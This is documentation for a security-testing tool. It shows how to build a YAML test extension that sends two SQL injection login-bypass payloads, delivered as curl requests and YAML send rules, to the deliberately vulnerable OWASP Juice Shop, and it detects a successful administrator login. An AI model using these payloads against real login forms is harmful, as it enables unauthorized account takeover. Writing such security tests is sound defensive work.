[link-meta-info]:           ../create-extension.md#structure-of-the-meta-info-section
[link-send-headers]:        ../phase-send.md
[link-using-extension]:     ../using-extension.md
[link-app-examination]:     app-examination.md

[doc-send-phase]:           ../phase-send.md
[doc-detect-phase]:         ../detect/phase-detect.md

[link-juice-shop]:          https://www.owasp.org/index.php/OWASP_Juice_Shop_Project



#   Creation of Nonmodifying Extension

The extension described in this document will not modify an incoming baseline request to inject some payload into. Instead, the two predefined test requests will be sent to the host that is specified in the baseline request. These test requests contain payloads that could lead to exploitation of the SQLi vulnerability in the [“OWASP Juice Shop”][link-juice-shop] target application's login form.


##  Preparations

It is highly recommended to [investigate the target application's behavior][link-app-examination] prior to creation of the FAST extension.


##  Constructing the Extension

Create a file that describes the extension (e.g., `non-mod-extension.yaml`) and populate it with the required sections:

1.  [**The `meta-info` section**][link-meta-info].

    Prepare the description of the vulnerability that the extension will try to detect.
    
    * vulnerability header: `OWASP Juice Shop SQLi (non-mod extension)`
    * vulnerability description: `Demo of SQLi in OWASP Juice Shop (Admin Login)`
    * vulnerability type: SQL injection
    * vulnerability threat level: high
    
    The corresponding `meta-info` section should look as follows:
    
    ```
    meta-info:
      - type: sqli
      - threat: 80
      - title: 'OWASP Juice Shop SQLi (non-mod extension)'
      - description: 'Demo of SQLi in OWASP Juice Shop (Admin Login)'
    ```
    
2.  **The `send` section, the [Send phase][doc-send-phase]**

    There are two payloads that should be sent as an `email` parameter value alongside any `password` value in order to exploit the SQL injection vulnerability in the target application:
    
    * `'or 1=1 --`
    * `admin@juice-sh.op'--`
    
    You can craft two test requests, each containing
    
    * the `email` parameter with one of the values described above and 
    * the `password` parameter with an arbitrary value.

    It is sufficient to use just one of these requests to test our example target application (OWASP Juice Shop).
    
    However, having a set of several prepared test requests may be useful when conducting the security testing of a real application: if one of the requests can not exploit a vulnerability anymore thanks to updates and improvements in the application, then there will be other test requests available that may still exploit the vulnerability because of other payloads in use.

    The request with the first payload from the list above is similar to this one:
    
    ```
    curl --request POST --url http://ojs.example.local/rest/user/login \
         --header 'content-type: application/json' \
         --header 'host: ojs.example.local' \
         --data '{"email":"'\''or 1=1 --", "password":"12345"}'
    ```

    The second request looks like the first one:

    ```
    curl --request POST --url http://ojs.example.local/rest/user/login \
         --header 'content-type: application/json' \
         --header 'host: ojs.example.local' \
         --data '{"email":"admin@juice-sh.op'\''--", "password":"12345"}'
    ```

    Add the `send` section containing the descriptions of these two test requests:
    
    ```
    send:
      - method: 'POST'
        url: '/rest/user/login'
        headers:
        - 'Content-Type': 'application/json'
        body: '{"email":"''or 1=1 --","password":"12345"}'
      - method: 'POST'
        url: '/rest/user/login'
        headers:
        - 'Content-Type': 'application/json'
        body: '{"email":"admin@juice-sh.op''--","password":"12345"}'
    ``` 
    
    !!! info "A note about the `Host` header" 
        The `Host` header can be omitted in these requests because it does not influence the exploitation of this particular SQLi vulnerability. A FAST node will automatically add the `Host` header extracted from an incoming baseline requests.
        
        Read [here][link-send-headers] about how the Send phase handles request's headers.

     3.  **The `detect` section, the [Detect phase][doc-detect-phase]**.
    
    The following conditions indicate that the user authentication with administrator's rights was successful:
    
    * The presence of the shopping cart identifier parameter with the `1` value in the response body. The parameter is in JSON format and should look like this:
    
        ```
        "bid":1
        ```
    
    * The presence of the user email parameter with the `admin@juice-sh.op` value in the response body. The parameter is in JSON format and should look like this:
    
        ```
         "umail":"admin@juice-sh.op"
        ```
    
    Add the `detect` section that checks whether the attack was successful according to the conditions described above.
    
    ```
    detect:
      - response:
        - body: "\"umail\":\"admin@juice-sh.op\""
        - body: "\"bid\":1"
    ```
    
!!! info "Escaping the special symbols"
    Remember to escape the special symbols in the strings.

##  Extension File

Now the `non-mod-extension.yaml` file contains a complete set of the sections required for the extension to operate. The list of the file's contents is shown below:

??? info "non-mod-extension.yaml"
    ```
    meta-info:
      - type: sqli
      - threat: 80
      - title: 'OWASP Juice Shop SQLi (non-mod extension)'
      - description: 'Demo of SQLi in OWASP Juice Shop (Admin Login)'

    send:
      - method: 'POST'
        url: '/rest/user/login'
        headers:
        - 'Content-Type': 'application/json'
        body: '{"email":"''or 1=1 --","password":"12345"}'
      - method: 'POST'
        url: '/rest/user/login'
        headers:
        - 'Content-Type': 'application/json'
        body: '{"email":"admin@juice-sh.op''--","password":"12345"}'

    detect:
      - response:
        - body: "\"umail\":\"admin@juice-sh.op\""
        - body: "\"bid\":1"
    ```

##  Using Extension

For detailed information about how to use the created expression, read [this document][link-using-extension].